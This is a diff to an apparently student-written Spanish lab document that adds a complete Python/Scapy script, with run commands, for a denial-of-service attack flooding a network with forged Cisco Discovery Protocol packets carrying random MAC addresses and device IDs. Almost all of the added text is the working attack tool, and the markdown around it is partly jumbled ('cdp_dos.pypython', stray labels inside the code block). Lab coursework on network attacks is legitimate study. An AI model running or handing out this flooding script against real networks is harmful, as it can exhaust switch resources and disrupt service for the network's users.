@@ -41,8 +41,68 @@ Generar una inundación masiva de paquetes CDP falsos con Device IDs y MACs alea
 6. Muestra el progreso cada 100 paquetes enviados
 
 ```bash
-sudo python3 cdp_dos.py <interfaz> [cantidad]
+
+ruta:
+nano /home/kali-linux/cdp_dos.pypython
+
+Script
+#!/usr/bin/env python3
+# =============================================================
+# Nombre:     Henry Vicente Quezada
+# Matricula:  2025-1332
+# Ataque:     DoS mediante protocolo CDP
+# Fecha:      2026
+# =============================================================
+from scapy.all import *
+from scapy.contrib.cdp import *
+import random
+import time
+import sys
+
+def random_mac():
+    return "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(
+        random.randint(0, 255) for _ in range(6)
+    )
+
+def cdp_dos(interfaz, cantidad=1000):
+    print("=" * 55)
+    print("       ATAQUE DoS - PROTOCOLO CDP")
+    print("       Autor:     Henry Vicente Quezada")
+    print("       Matricula: 2025-1332")
+    print("=" * 55)
+    print(f"[*] Interfaz     : {interfaz}")
+    print(f"[*] Paquetes     : {cantidad}")
+    print(f"[*] Iniciando ataque...\n")
+    for i in range(cantidad):
+        src_mac = random_mac()
+        device_id = f"Device-{random.randint(1000,9999)}"
+        pkt = (
+            Ether(src=src_mac, dst="01:00:0c:cc:cc:cc") /
+            LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
+            SNAP(OUI=0x00000C, code=0x2000) /
+            CDPv2_HDR() /
+            CDPMsgDeviceID(val=device_id) /
+            CDPMsgSoftwareVersion(val="Cisco IOS 15.2") /
+            CDPMsgPlatform(val="cisco WS-C3750")
+        )
+        sendp(pkt, iface=interfaz, verbose=False)
+        if (i+1) % 100 == 0:
+            print(f"[+] Paquetes enviados: {i+1}/{cantidad}")
+        time.sleep(0.001)
+    print(f"\n[✓] Ataque completado. {cantidad} paquetes enviados.")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print("\nUso:     sudo python3 cdp_dos.py <interfaz> [cantidad]")
+        print("Ejemplo: sudo python3 cdp_dos.py eth0 500\n")
+        sys.exit(1)
+    interfaz = sys.argv[1]
+    cantidad = int(sys.argv[2]) if len(sys.argv) > 2 else 1000
+    cdp_dos(interfaz, cantidad)
+
+ejecución: 
 sudo python3 cdp_dos.py eth0 500
+
 ```
 
 ---
